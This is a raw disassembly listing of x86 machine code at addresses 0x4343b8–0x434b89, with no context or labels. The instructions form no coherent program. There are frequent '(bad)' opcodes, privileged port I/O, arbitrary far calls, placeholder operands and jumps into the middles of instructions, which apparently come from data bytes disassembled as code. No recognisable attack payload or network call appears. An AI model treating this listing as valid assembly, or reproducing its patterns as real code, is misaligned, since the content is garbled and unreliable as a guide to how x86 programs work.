  4343b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4343b9:	and    al,0xb8
  4343bb:	push   es
  4343bc:	in     eax,0x78
  4343be:	jb     0x43442f
  4343c0:	mov    ah,0x3f
  4343c2:	fnsave [ebx]
  4343c4:	es fwait
  4343c6:	adc    al,0xc4
  4343c8:	out    dx,al
  4343c9:	xchg   DWORD PTR [ebp+0x14],esp
  4343cc:	gs jnp 0x43437b
  4343cf:	mov    ecx,esi
  4343d1:	push   0x378c783b
  4343d6:	gs mov ebx,0xc30753b4
  4343dc:	jae    0x43444a
  4343de:	repnz in eax,dx
  4343e0:	lods   al,BYTE PTR ds:[esi]
  4343e1:	pcmpeqw mm6,QWORD PTR [ecx+0x4f]
  4343e5:	mov    bh,0x8c
  4343e7:	out    dx,al
  4343e8:	pop    esp
  4343e9:	mov    DWORD PTR [esi],edi
  4343eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4343ec:	imul   ecx,DWORD PTR [esi-0x35],0x27
  4343f0:	ja     0x43445c
  4343f2:	push   ebx
  4343f3:	fcmovbe st,st(0)
  4343f5:	push   edi
  4343f6:	loop   0x4343f2
  4343f8:	call   0xf193:0xe3ec4b98
  4343ff:	scas   al,BYTE PTR es:[edi]
  434400:	jmp    0x4343d3
  434402:	push   esi
  434403:	mov    ds:0xf7d17302,al
  434408:	jle    0x434427
  43440a:	lods   al,BYTE PTR ds:[esi]
  43440b:	pop    ecx
  43440c:	mov    ecx,0x8a0a7311
  434411:	adc    dl,BYTE PTR [edx]
  434413:	aam    0x9c
  434415:	xchg   ebp,eax
  434416:	pop    ss
  434417:	int3   
  434418:	add    ecx,edx
  43441a:	test   eax,0x6b2778e6
  43441f:	add    ebx,edi
  434421:	inc    ebx
  434422:	fwait
  434423:	ins    BYTE PTR es:[edi],dx
  434424:	ret    0x4591
  434427:	fisub  DWORD PTR [edi]
  434429:	rcl    BYTE PTR [bp+si],0xae
  43442d:	push   es
  43442e:	or     BYTE PTR [esi],0x49
  434431:	(bad)  
  434432:	pop    edx
  434433:	mov    WORD PTR [ebx],?
  434435:	out    0x31,al
  434437:	push   cs
  434438:	iret   
  434439:	cmp    al,0xff
  43443b:	mov    ds:0xb6867d94,eax
  434440:	or     DWORD PTR [edx+0x2114cd0f],ebx
  434446:	mov    DWORD PTR [eax+0x40],eax
  434449:	mov    ds:0x2608e9c5,eax
  43444e:	out    0x6e,eax
  434450:	(bad)  
  434451:	pop    ds
  434452:	dec    esp
  434453:	bound  ebx,QWORD PTR [ecx+ecx*4]
  434456:	xchg   esp,eax
  434457:	sbb    ebp,DWORD PTR [ebx]
  434459:	imul   eax,DWORD PTR [eax],0x38
  43445c:	or     eax,0x2b604870
  434461:	mov    al,0x0
  434463:	mov    eax,ds:0x83abbaec
  434468:	xor    DWORD PTR [esi-0x30],ecx
  43446b:	push   edi
  43446c:	xor    al,0x9c
  43446e:	mov    al,0xa
  434470:	sbb    al,BYTE PTR [eax]
  434472:	mov    cl,0x61
  434474:	pushf  
  434475:	sub    BYTE PTR [eax-0x80],al
  434478:	pop    ss
  434479:	mov    ds:0x53b2bda1,al
  43447e:	add    ebp,DWORD PTR [edi+0x27]
  434481:	xchg   edx,eax
  434482:	push   ecx
  434483:	mov    dl,0x9a
  434485:	dec    esp
  434486:	daa    
  434487:	leave  
  434488:	stos   DWORD PTR es:[edi],eax
  434489:	ds es pop ss
  43448c:	dec    esp
  43448d:	sbb    al,0x90
  43448f:	inc    ebx
  434490:	dec    ebp
  434491:	pusha  
  434492:	test   al,0x39
  434494:	stc    
  434495:	inc    ecx
  434496:	push   eax
  434497:	jne    0x4344de
  434499:	(bad)  
  43449a:	or     ecx,ecx
  43449c:	loope  0x4344d2
  43449e:	mov    eax,ds:0xb446f5e4
  4344a3:	xchg   ebx,eax
  4344a4:	jle    0x43449b
  4344a6:	(bad)
  4344a9:	leave  
  4344aa:	mov    eax,ds:0x2619cc38
  4344af:	or     cl,BYTE PTR [edi]
  4344b1:	in     al,dx
  4344b2:	mov    dl,0x1c
  4344b4:	jle    0x434458
  4344b6:	push   edx
  4344b7:	cs test eax,0x93204cd1
  4344bd:	mov    esi,0x271a724
  4344c2:	and    BYTE PTR [ecx],al
  4344c4:	ja     0x434485
  4344c6:	sub    BYTE PTR [ebx],bh
  4344c8:	aad    0x70
  4344ca:	xor    al,0xf5
  4344cc:	enter  0xd02,0xd0
  4344d0:	adc    al,ah
  4344d2:	push   ds
  4344d3:	mov    ds:0x9b19d25,al
  4344d8:	mov    BYTE PTR [esi-0x60],ch
  4344db:	scas   al,BYTE PTR es:[edi]
  4344dc:	dec    edi
  4344dd:	(bad)  
  4344de:	(bad)  
  4344df:	enter  0x10c7,0x55
  4344e3:	jp     0x434525
  4344e5:	push   ss
  4344e6:	dec    edx
  4344e7:	leave  
  4344e8:	pop    ss
  4344e9:	repnz mov bh,BYTE PTR [edx+ecx*2-0x4b]
  4344ee:	enter  0xad80,0x89
  4344f2:	js     0x434503
  4344f4:	jne    0x434512
  4344f6:	(bad)  
  4344f7:	fs in  eax,dx
  4344f9:	xchg   eax,esi
  4344fb:	sbb    eax,eax
  4344fd:	and    ah,BYTE PTR [eax-0x58]
  434500:	mov    ds:0x5e3277ba,eax
  434505:	retf   0x5b36
  434508:	jp     0x4344f8
  43450a:	push   eax
  43450b:	mov    ah,0xb
  43450d:	mov    ebx,0xf1d5c017
  434512:	cwde   
  434513:	shl    DWORD PTR [eax+ebx*4],cl
  434516:	dec    esi
  434517:	ins    DWORD PTR es:[di],dx
  434519:	and    ah,bh
  43451b:	dec    ebx
  43451c:	xor    al,0x87
  43451e:	enter  0x6a44,0x57
  434522:	ror    BYTE PTR [esi],cl
  434524:	push   cs
  434525:	retf   
  434526:	leave  
  434527:	sub    eax,0xc76c6247
  43452c:	fs adc bl,dl
  43452f:	and    esi,DWORD PTR [edx]
  434531:	inc    ebp
  434532:	cli    
  434533:	jno    0x4344ee
  434535:	push   0x12
  434537:	adc    DWORD PTR [edx],ecx
  434539:	ret    0xd86b
  43453c:	call   0x647183aa
  434541:	ins    DWORD PTR es:[edi],dx
  434542:	ret    
  434543:	test   DWORD PTR [edx+0x32],0x4f37eb0f
  43454a:	rol    DWORD PTR ds:0x54f8ece,1
  434550:	repnz dec esi
  434552:	dec    esp
  434553:	push   0xd7424f34
  434558:	cwde   
  434559:	sbb    DWORD PTR [eax+0x7382400f],0xfffffff4
  434560:	sub    BYTE PTR [ebx-0x80],bh
  434563:	jne    0x434531
  434565:	cli    
  434566:	inc    ebp
  434567:	jae    0x43458e
  434569:	jb     0x43458c
  43456b:	fnstenv [edi-0x6d]
  43456e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43456f:	lsl    esp,WORD PTR [edi]
  434572:	xchg   BYTE PTR [eax+0x27],dh
  434575:	(bad)  
  434577:	mov    bl,0xb7
  434579:	inc    eax
  43457a:	arpl   WORD PTR [esi-0x75f801cb],dx
  434580:	xor    eax,0xd8180d05
  434585:	arpl   WORD PTR [eax+0x3b],ax
  434588:	dec    esp
  434589:	xor    ch,al
  43458b:	sub    DWORD PTR [edx],esp
  43458d:	add    al,BYTE PTR [esi+esi*2+0x5a7399b0]
  434594:	and    ebx,DWORD PTR [esi-0x7c]
  434597:	(bad)
  43459b:	popf   
  43459c:	push   esi
  43459d:	imul   ebx,ecx,0xffffffb5
  4345a0:	jns    0x4345fc
  4345a2:	xor    DWORD PTR ds:0x3611c364,ebx
  4345a8:	ret    
  4345a9:	cs ret 0x190c
  4345ad:	rol    cl,1
  4345af:	and    cl,BYTE PTR [eax+0x63770698]
  4345b5:	xchg   ebx,eax
  4345b6:	pusha  
  4345b7:	(bad)  
  4345b8:	ins    DWORD PTR es:[edi],dx
  4345b9:	(bad)  
  4345ba:	loopne 0x4345fb
  4345bc:	pop    esp
  4345bd:	cld    
  4345be:	jnp    0x4345fd
  4345c0:	es mov eax,ecx
  4345c3:	push   es
  4345c4:	stos   BYTE PTR es:[edi],al
  4345c5:	jp     0x434612
  4345c7:	or     al,0xf0
  4345c9:	test   al,0x1c
  4345cb:	adc    al,ah
  4345cd:	mov    esi,0x21b34244
  4345d2:	xchg   ebp,esp
  4345d4:	in     al,dx
  4345d5:	sub    ecx,DWORD PTR [edx+0x66]
  4345d8:	inc    ecx
  4345d9:	retf   
  4345da:	xor    al,0x13
  4345dc:	or     eax,DWORD PTR [ecx-0x7d9ddbf7]
  4345e2:	neg    DWORD PTR [edx+0x5daf60fe]
  4345e8:	xchg   esp,eax
  4345e9:	aad    0x68
  4345eb:	pushf  
  4345ec:	sahf   
  4345ed:	pushf  
  4345ee:	mov    eax,0x48609e38
  4345f3:	(bad)  
  4345f4:	jno    0x43458b
  4345f6:	es or  al,0x42
  4345f9:	push   ss
  4345fa:	xor    al,0x88
  4345fc:	stos   DWORD PTR es:[edi],eax
  4345fd:	pop    ecx
  4345fe:	lahf   
  4345ff:	lock das 
  434601:	loopne 0x4345ab
  434603:	add    dl,ah
  434605:	test   DWORD PTR [edx],edi
  434607:	mov    esp,DWORD PTR [eax+0x4d]
  43460a:	(bad)  
  43460c:	mov    WORD PTR [ecx-0x6e1b87bf],?
  434612:	test   esp,esi
  434614:	sahf   
  434615:	pop    es
  434616:	in     eax,0x5c
  434618:	pop    es
  434619:	fidivr WORD PTR [ebx-0x1e0964ee]
  43461f:	in     al,dx
  434620:	mov    edx,0xbf4e3951
  434625:	xchg   esi,eax
  434626:	int    0x39
  434628:	jmp    0xdeb6b003
  43462d:	retf   0xc7ee
  434630:	cs pushfw 
  434633:	icebp  
  434634:	out    0x2c,eax
  434636:	enter  0x23d1,0xb4
  43463a:	sbb    BYTE PTR [eax+0x32],cl
  43463d:	loopne 0x43466a
  43463f:	inc    esp
  434640:	mov    bl,0x0
  434642:	push   cs
  434643:	dec    ebp
  434644:	loop   0x434653
  434646:	into   
  434647:	push   esp
  434648:	pushf  
  434649:	jp     0x4345e3
  43464b:	lea    ebp,[ecx+0x3e]
  43464e:	pop    esi
  43464f:	xchg   ecx,eax
  434650:	or     ebx,DWORD PTR [eax-0x16ed8e60]
  434656:	mov    eax,ds:0x2f648f3a
  43465b:	aas    
  43465c:	enter  0xcacb,0xec
  434660:	jge    0x43461b
  434662:	aas    
  434663:	mov    edx,esp
  434665:	(bad)  ds:0xe4c544f9
  43466b:	shr    BYTE PTR [ecx],0x4c
  43466e:	(bad)  
  43466f:	and    eax,0x9a3c2007
  434674:	push   ebx
  434675:	xor    dl,dl
  434677:	mov    al,0xe9
  434679:	ins    DWORD PTR es:[edi],dx
  43467a:	jnp    0x434609
  43467c:	inc    ebx
  43467d:	and    eax,0x7ee6bc77
  434682:	aaa    
  434683:	push   eax
  434684:	sub    BYTE PTR [eax-0x68],0x98
  434688:	jg     0x434676
  43468a:	or     eax,0x46883004
  43468f:	add    al,0xa9
  434691:	mov    WORD PTR fs:[edx],es
  434694:	div    DWORD PTR [eax]
  434696:	xchg   esi,eax
  434697:	adc    esp,DWORD PTR gs:[eax]
  43469a:	or     DWORD PTR [eax+0x2c95b53c],eax
  4346a0:	cmp    DWORD PTR [esi],esi
  4346a2:	cmp    al,0x13
  4346a4:	inc    edx
  4346a5:	sbb    dh,BYTE PTR es:[esi]
  4346a8:	rol    DWORD PTR [edx-0x2e9a9cf4],1
  4346ae:	bound  edi,QWORD PTR [ebx+0x4c3d21e4]
  4346b4:	add    esp,ebp
  4346b6:	test   eax,0x49f9f12b
  4346bb:	cmp    DWORD PTR [esi-0x46],esp
  4346be:	sbb    DWORD PTR [ebx-0x3de20f67],ecx
  4346c4:	pop    es
  4346c5:	pshufw mm1,QWORD PTR [esi+0x10fb23a0],0x7b
  4346cd:	popf   
  4346ce:	(bad)  
  4346cf:	(bad)
  4346d2:	(bad)  
  4346d3:	(bad)  
  4346d4:	xchg   esi,eax
  4346d5:	push   es
  4346d6:	push   eax
  4346d7:	test   BYTE PTR [edx-0x24],bl
  4346da:	cs dec ebx
  4346dc:	repnz (bad) 
  4346de:	sbb    BYTE PTR [eax-0xf6f2723],ah
  4346e4:	loopne 0x4346f9
  4346e6:	adc    esp,DWORD PTR [edi]
  4346e8:	cdq    
  4346e9:	or     BYTE PTR [esi-0x3],bh
  4346ec:	push   ss
  4346ed:	sbb    DWORD PTR [ebp+0x3e1c3fc5],esi
  4346f3:	pushf  
  4346f4:	mov    al,BYTE PTR [ecx+eax*8-0xe404d56]
  4346fb:	(bad)  
  4346fc:	adc    al,BYTE PTR [ebx+0x70c58c5f]
  434702:	and    ah,BYTE PTR [esi]
  434704:	add    edx,ecx
  434706:	cmc    
  434707:	outs   dx,BYTE PTR ds:[esi]
  434708:	fldenv [ebx-0x727295f4]
  43470e:	xchg   edx,eax
  43470f:	(bad)  
  434710:	push   ecx
  434711:	popf   
  434712:	pop    es
  434713:	addr16 pop esi
  434715:	jg     0x434783
  434717:	scas   al,BYTE PTR es:[edi]
  434718:	ret    
  434719:	mov    dl,0x60
  43471b:	es inc ebx
  43471d:	nop
  43471e:	sar    DWORD PTR [ebp+0x33899e29],cl
  434724:	xchg   esi,eax
  434725:	jns    0x4346c2
  434727:	nop
  434728:	xor    edx,DWORD PTR [ebx]
  43472a:	out    dx,eax
  43472b:	enter  0x857e,0x3c
  43472f:	aas    
  434730:	popf   
  434731:	mov    BYTE PTR [ecx+0x22],al
  434734:	inc    eax
  434735:	jns    0x43477f
  434737:	jbe    0x434759
  434739:	and    ah,0xc4
  43473c:	push   esp
  43473d:	stos   BYTE PTR es:[edi],al
  43473e:	xchg   edx,eax
  43473f:	jae    0x43475f
  434741:	or     ch,cl
  434743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434744:	jmp    0x434758
  434746:	push   0xf27c94e9
  43474b:	pop    ebp
  43474d:	mov    ebx,0xdd667e61
  434752:	in     al,0x36
  434754:	cmp    BYTE PTR [edi],bh
  434756:	jae    0x43478a
  434758:	pop    esi
  434759:	popa   
  43475a:	cmp    al,0xe6
  43475c:	es cmc 
  43475e:	jmp    0x434751
  434760:	clc    
  434761:	push   ds
  434762:	loope  0x4346e7
  434764:	pop    edi
  434765:	add    al,bh
  434767:	cmp    DWORD PTR [ebp-0x30],esp
  43476a:	(bad)  
  43476b:	arpl   WORD PTR [ebp-0x21bc3edb],cx
  434771:	ret    
  434772:	jb     0x434770
  434774:	mov    ds:0xd9a1325a,eax
  434779:	cmp    esi,edx
  43477b:	sub    DWORD PTR [edx],ecx
  43477d:	xor    dh,BYTE PTR [ecx+0xe21653]
  434783:	(bad)  
  434784:	jb     0x43472d
  434786:	in     eax,dx
  434787:	bound  esi,QWORD PTR [esi+0x2c64f6e6]
  43478d:	add    BYTE PTR [ebx+0x4d],dh
  434790:	sbb    BYTE PTR [esp+esi*2],bl
  434793:	call   0x8c2f80b5
  434798:	mov    al,0x43
  43479a:	imul   eax,DWORD PTR [esi],0xffffffd2
  43479d:	fwait
  43479e:	scas   al,BYTE PTR es:[edi]
  43479f:	mov    ebx,0x23cdcf11
  4347a4:	arpl   ax,sp
  4347a6:	cmp    al,0x8
  4347a8:	sub    DWORD PTR [esi+0x66],0xe08b837f
  4347af:	xor    ecx,DWORD PTR [eax+ecx*1-0x37]
  4347b3:	ret    0x4721
  4347b6:	xor    BYTE PTR [edx-0x54bbbc09],dl
  4347bc:	or     al,0x4
  4347be:	retf   0xbfe9
  4347c1:	mov    cl,0xbb
  4347c3:	jno    0x4347ab
  4347c5:	mov    eax,ds:0x884e5186
  4347ca:	cld    
  4347cb:	clc    
  4347cc:	mov    esp,0x17210858
  4347d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4347d2:	sub    DWORD PTR [eax-0x42c03da0],edx
  4347d8:	jno    0x434817
  4347da:	loope  0x434771
  4347dc:	std    
  4347dd:	sbb    ah,bh
  4347df:	pop    ebx
  4347e0:	repnz dec ecx
  4347e2:	xchg   DWORD PTR [edx-0x26],edi
  4347e5:	outs   dx,DWORD PTR es:[esi]
  4347e7:	fs pusha 
  4347e9:	lahf   
  4347ea:	push   0x68e22004
  4347ef:	ltr    WORD PTR [ecx]
  4347f2:	ror    BYTE PTR [edi],0x6c
  4347f5:	inc    esp
  4347f6:	ret    0x803a
  4347f9:	aas    
  4347fa:	mov    es,edi
  4347fc:	loop   0x434859
  4347fe:	mov    bh,dh
  434800:	mov    eax,ds:0x27ffa4e9
  434805:	add    DWORD PTR [ebp+eax*8+0x62],0x91a84f80
  43480d:	imul   ebx,DWORD PTR [eax+esi*8],0xf6cbb6e0
  434814:	adc    al,0x31
  434816:	ins    DWORD PTR es:[edi],dx
  434817:	stos   BYTE PTR es:[edi],al
  434818:	icebp  
  434819:	add    bl,BYTE PTR [ecx-0x23]
  43481c:	retf   
  43481d:	cli    
  43481e:	dec    edx
  43481f:	or     al,0x3f
  434821:	cmp    eax,0x121c92f7
  434826:	and    eax,0x8e8a8a2c
  43482b:	and    ecx,DWORD PTR [esi+0x3a189e13]
  434831:	pop    edx
  434832:	aad    0x9a
  434834:	pushf  
  434835:	mov    al,0x84
  434837:	adc    BYTE PTR [esi],al
  434839:	fcom   QWORD PTR [edx+ebx*8-0x3724d6c3]
  434840:	push   ebx
  434841:	jb     0x4347d1
  434843:	aas    
  434844:	lahf   
  434845:	ja     0x43480b
  434847:	pushf  
  434848:	add    BYTE PTR [esi-0x2ec9ca86],dh
  43484e:	in     eax,0xd8
  434850:	and    BYTE PTR [edx+ebp*8-0x3611006c],bl
  434857:	add    DWORD PTR ss:[edi],esp
  43485a:	or     esp,DWORD PTR [esi+0x5678f9c9]
  434860:	outs   dx,DWORD PTR ds:[esi]
  434861:	(bad)  
  434862:	test   ebx,0x31e3de31
  434868:	into   
  434869:	fcomp  DWORD PTR [edi+0x23930c69]
  43486f:	xor    eax,0xbb25a6d1
  434874:	cmp    BYTE PTR [ecx],cl
  434876:	xchg   edx,eax
  434877:	imul   esi,DWORD PTR [ecx-0x4ded8edf],0x58
  43487e:	daa    
  43487f:	fs xchg ebp,eax
  434881:	sbb    dl,bl
  434883:	js     0x4348bd
  434885:	out    dx,al
  434886:	mov    dh,0xa3
  434888:	ins    DWORD PTR es:[edi],dx
  434889:	clc    
  43488a:	sub    al,0x14
  43488c:	idiv   DWORD PTR [ebp+0x6343cd9c]
  434892:	int3   
  434893:	das    
  434894:	out    dx,eax
  434895:	daa    
  434896:	ja     0x4348da
  434898:	xor    esi,eax
  43489a:	jmp    0x7357c78
  43489f:	inc    edi
  4348a0:	call   0x45373755
  4348a5:	aaa    
  4348a6:	jb     0x4348b3
  4348a8:	sbb    BYTE PTR [edx+0x58cc1cf3],0xd6
  4348af:	pop    ebp
  4348b0:	xchg   DWORD PTR [edi+eax*4+0x11],ebx
  4348b4:	rcr    BYTE PTR [eax+0x3094ab3c],cl
  4348ba:	pop    edi
  4348bb:	push   cs
  4348bc:	into   
  4348bd:	leave  
  4348be:	repz or eax,0xb4905bd8
  4348c4:	mov    ecx,cs
  4348c6:	in     al,0x2c
  4348c8:	mov    WORD PTR [ecx],?
  4348ca:	mov    eax,ds:0x641d76f9
  4348cf:	out    0xc6,al
  4348d1:	ins    BYTE PTR es:[edi],dx
  4348d2:	les    edx,FWORD PTR [esi+ebp*8+0x20713590]
  4348d9:	rcl    BYTE PTR [ebx],1
  4348db:	jb     0x4348c1
  4348dd:	xchg   DWORD PTR [ebx+ebx*1+0x4],edi
  4348e1:	cmp    BYTE PTR [edx+0x36d23977],bl
  4348e7:	push   edx
  4348e8:	mov    WORD PTR [ebx],es
  4348ea:	mov    cl,0xec
  4348ec:	mov    bh,0x17
  4348ee:	add    al,0x95
  4348f0:	dec    esp
  4348f1:	xor    DWORD PTR [esp+esi*2+0x31c454e1],ecx
  4348f8:	add    DWORD PTR [edx+edx*1+0x432bb021],ecx
  4348ff:	push   ebx
  434900:	ja     0x4348e5
  434902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434903:	dec    ebx
  434904:	(bad)  [ebx-0x6da5035f]
  43490a:	sar    DWORD PTR [eax+0x70],1
  43490d:	or     edx,DWORD PTR [eax]
  43490f:	xor    esp,DWORD PTR [edi]
  434911:	aam    0x82
  434913:	push   ebx
  434914:	adc    DWORD PTR [ebx-0x7f85d0cb],0x67
  43491b:	cmp    ebx,DWORD PTR [ebp-0x29]
  43491e:	daa    
  43491f:	sti    
  434920:	das    
  434921:	push   0xfe0c72d3
  434926:	mov    eax,ds:0x37c2816c
  43492b:	cwde   
  43492c:	cli    
  43492d:	xchg   ecx,eax
  43492e:	ss ds sub al,0xb8
  434932:	aad    0xb1
  434934:	cmp    BYTE PTR [ebx-0x20],dh
  434937:	adc    esp,ecx
  434939:	xchg   ebx,eax
  43493a:	jbe    0x434915
  43493c:	lahf   
  43493d:	inc    eax
  43493e:	mov    esp,0x2715d09f
  434943:	mov    eax,DWORD PTR cs:[edi]
  434946:	sti    
  434947:	push   cs
  434948:	ror    BYTE PTR [edi],0x20
  43494b:	xchg   ebx,eax
  43494c:	retf   
  43494d:	ror    DWORD PTR [esi],1
  43494f:	test   al,0xcf
  434951:	stos   BYTE PTR es:[edi],al
  434952:	mov    ds:0x68aed83d,al
  434957:	and    eax,0x9b472f
  43495c:	add    DWORD PTR fs:[ecx+eax*2-0x5e371260],ebp
  434964:	xor    DWORD PTR [esp+eax*4],esi
  434967:	xlat   BYTE PTR ds:[ebx]
  434968:	(bad)  
  43496a:	xchg   ebx,eax
  43496b:	ds pushf 
  43496d:	addr16 imul esp,edx,0x8bb9c6a9
  434974:	pop    ds
  434975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434976:	aaa    
  434977:	fiadd  WORD PTR [ebp+0x78]
  43497a:	sub    DWORD PTR [ebp-0x11451eeb],ecx
  434980:	sbb    BYTE PTR [ebx-0x64],ah
  434983:	xchg   edx,eax
  434984:	adc    BYTE PTR [edi-0x5c],al
  434987:	icebp  
  434988:	mov    eax,0x89cb7314
  43498d:	mov    ebp,ebp
  43498f:	or     al,0xb0
  434991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434992:	sub    bh,BYTE PTR [ebx-0x53f932e9]
  434998:	jnp    0x43496c
  43499a:	add    al,0x2e
  43499c:	retf   0xdd61
  43499f:	aam    0x3e
  4349a1:	mov    ds:0x49d9e941,al
  4349a6:	or     BYTE PTR [ebp-0x5794e26b],bl
  4349ac:	mov    bh,0xa7
  4349ae:	gs or  eax,0x64acea0e
  4349b4:	fistp  QWORD PTR [edi+0x56c18d94]
  4349ba:	mov    esp,0x734e586f
  4349bf:	inc    esi
  4349c0:	jnp    0x434a1f
  4349c2:	mov    ?,ecx
  4349c4:	add    DWORD PTR [ecx-0x38],ebp
  4349c7:	sub    DWORD PTR [esi+0x7e],ecx
  4349ca:	pop    es
  4349cb:	std    
  4349cc:	cdq    
  4349cd:	xchg   ebp,eax
  4349ce:	sbb    DWORD PTR [edi+0x20e59d00],ebx
  4349d4:	and    edx,esi
  4349d6:	xor    ebx,DWORD PTR [ebx]
  4349d8:	push   ss
  4349d9:	dec    ebp
  4349da:	xchg   esp,eax
  4349db:	inc    esp
  4349dc:	lods   al,BYTE PTR ds:[esi]
  4349dd:	sahf   
  4349de:	in     al,dx
  4349df:	cmp    edx,DWORD PTR [eax]
  4349e1:	mov    al,0x38
  4349e3:	sbb    ecx,DWORD PTR [ecx-0x80]
  4349e6:	inc    edx
  4349e7:	mov    ebx,0xe841c702
  4349ec:	sbb    ecx,esp
  4349ee:	inc    eax
  4349ef:	inc    esi
  4349f0:	and    bh,BYTE PTR [ebx-0x7e]
  4349f3:	nop
  4349f4:	xor    al,0xf9
  4349f6:	sbb    ah,dl
  4349f8:	loope  0x4349fe
  4349fa:	inc    eax
  4349fb:	push   ebp
  4349fc:	pop    ds
  4349fd:	arpl   ax,cx
  4349ff:	pop    edx
  434a00:	lods   eax,DWORD PTR ds:[esi]
  434a01:	xchg   esi,eax
  434a02:	test   eax,0xed656ee8
  434a07:	popf   
  434a08:	lea    edi,[ecx-0x6bb56bda]
  434a0e:	stos   BYTE PTR es:[edi],al
  434a0f:	in     al,dx
  434a10:	pop    edi
  434a11:	cmp    bl,BYTE PTR [ecx+ebp*8]
  434a14:	shl    BYTE PTR [ecx+ebp*1],0x80
  434a18:	(bad)  
  434a19:	fist   DWORD PTR [eax-0x4eaef977]
  434a1f:	and    BYTE PTR [eax+eiz*1],ch
  434a22:	in     al,dx
  434a23:	push   ecx
  434a24:	sub    eax,0x21c9e27b
  434a29:	and    BYTE PTR [esp+eax*2-0x5c48d258],al
  434a30:	sub    BYTE PTR [ebx-0x2a],0xc4
  434a34:	rcr    bh,0x96
  434a37:	jmp    0x434a3d
  434a39:	and    al,BYTE PTR [eax+eax*8-0x53]
  434a3d:	xchg   ebx,eax
  434a3e:	inc    ebp
  434a3f:	mov    bh,bl
  434a41:	sub    BYTE PTR [eax+0x4],0xd0
  434a45:	pop    ebx
  434a46:	and    bl,BYTE PTR ss:[ecx+0x49fb8a68]
  434a4d:	add    DWORD PTR [ebp+0x30e22725],edi
  434a53:	test   eax,0xaaccc96f
  434a58:	jmp    0x434a0c
  434a5a:	jae    0x434a6a
  434a5c:	mov    ch,0xb9
  434a5e:	push   ebx
  434a5f:	push   es
  434a60:	shl    BYTE PTR [ebx+ebp*8+0x60802be0],1
  434a67:	adc    ebx,ebx
  434a69:	out    dx,al
  434a6a:	xor    DWORD PTR [ecx],edi
  434a6c:	xchg   esi,eax
  434a6d:	dec    ebx
  434a6e:	out    dx,al
  434a6f:	inc    ecx
  434a70:	call   0x346:0x841d7e98
  434a77:	pop    es
  434a78:	push   es
  434a79:	dec    edx
  434a7a:	mov    ebp,0x89d2e32b
  434a7f:	adc    al,0x9c
  434a81:	xchg   edi,eax
  434a82:	cdq    
  434a83:	xchg   edi,eax
  434a84:	dec    eax
  434a85:	int3   
  434a86:	rol    DWORD PTR [edi-0x3e],0x38
  434a8a:	test   ecx,0x82c9430e
  434a90:	call   0xac31c316
  434a95:	icebp  
  434a96:	out    dx,al
  434a97:	mov    ah,0x41
  434a99:	inc    edi
  434a9a:	je     0x434aeb
  434a9c:	xor    eax,0x9583a53e
  434aa1:	cdq    
  434aa2:	rcl    BYTE PTR [ecx-0x5c],0x6b
  434aa6:	dec    esi
  434aa7:	inc    esi
  434aa8:	jg     0x434a84
  434aaa:	in     al,0xb4
  434aac:	ins    DWORD PTR es:[edi],dx
  434aad:	mov    esp,0x3ae738c4
  434ab2:	cmp    BYTE PTR gs:[edx+edi*8-0x1],dh
  434ab7:	mov    ecx,0xb39a7f78
  434abc:	inc    ebx
  434abd:	jb     0x434aed
  434abf:	add    DWORD PTR [eax+ecx*4+0x4e33d96b],edi
  434ac6:	enter  0x6521,0x22
  434aca:	inc    ebx
  434acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434acc:	ret    
  434acd:	add    ch,BYTE PTR [edx+0x39]
  434ad0:	adc    ch,BYTE PTR [ebp+0x79]
  434ad3:	push   eax
  434ad4:	push   esi
  434ad5:	jge    0x434aa8
  434ad7:	jo     0x434af9
  434ad9:	test   BYTE PTR [ebp+0x5915cca8],ah
  434adf:	dec    eax
  434ae0:	xchg   edx,eax
  434ae1:	push   0x5e
  434ae3:	adc    eax,0x598e39f
  434ae8:	iret   
  434ae9:	inc    ecx
  434aea:	sbb    dh,BYTE PTR [esi+0x6a]
  434aed:	pcmpgtd mm1,QWORD PTR [ebx-0x62]
  434af1:	pop    edx
  434af2:	mov    edx,ebx
  434af4:	call   0x65f4:0x65273c6a
  434afb:	scas   al,BYTE PTR es:[edi]
  434afc:	cmp    DWORD PTR [edx+0x6aa60c9],esi
  434b02:	mov    ebx,0xc41ab38f
  434b07:	sub    al,0x1a
  434b09:	xor    ah,cl
  434b0b:	pop    ebp
  434b0c:	jl     0x434b67
  434b0e:	shl    BYTE PTR [ebx+0x7b7d88c9],0xf8
  434b15:	js     0x434b63
  434b17:	(bad)  
  434b18:	pop    eax
  434b19:	xor    DWORD PTR [ebx],esp
  434b1b:	add    DWORD PTR [eiz*8-0x2e14b2d4],ebx
  434b22:	das    
  434b23:	scas   al,BYTE PTR es:[edi]
  434b24:	mov    eax,ds:0x4de33bcc
  434b29:	xchg   esp,eax
  434b2a:	add    eax,0x5cfc49fe
  434b2f:	or     BYTE PTR [ecx],ah
  434b31:	loopne 0x434af2
  434b33:	or     BYTE PTR [edx],bl
  434b35:	mov    al,0x35
  434b37:	push   0x5f7b8
  434b3c:	loopne 0x434ada
  434b3e:	ins    DWORD PTR es:[edi],dx
  434b3f:	pop    ecx
  434b40:	pop    ebp
  434b41:	rol    BYTE PTR [ebx-0x71fbf38],0xc8
  434b48:	fnstenv [eax-0x50]
  434b4b:	add    DWORD PTR [ecx-0x2f],edx
  434b4e:	enter  0xc791,0xeb
  434b52:	dec    edx
  434b53:	add    DWORD PTR [edx],0x6b488a60
  434b59:	ins    BYTE PTR es:[edi],dx
  434b5a:	inc    esi
  434b5b:	cmp    al,0xa0
  434b5d:	dec    eax
  434b5e:	ds push es
  434b60:	mov    edi,0x4793da3d
  434b65:	pop    es
  434b66:	stos   BYTE PTR es:[edi],al
  434b67:	mov    bl,0x45
  434b69:	or     DWORD PTR [esp+edx*4-0x3b],eax
  434b6d:	add    dl,BYTE PTR [esi+edx*4]
  434b70:	ror    cl,cl
  434b72:	mov    ebx,0xe3e6c8b1
  434b77:	mov    ebp,0xc48cb4b0
  434b7c:	ret    0x1ab8
  434b7f:	jmp    DWORD PTR [edi]
  434b81:	leave  
  434b82:	add    eax,0x465a660d
  434b87:	push   esp
  434b88:	xchg   ecx,eax
  434b89:	fimul  DWORD PTR [eax+esi*2]
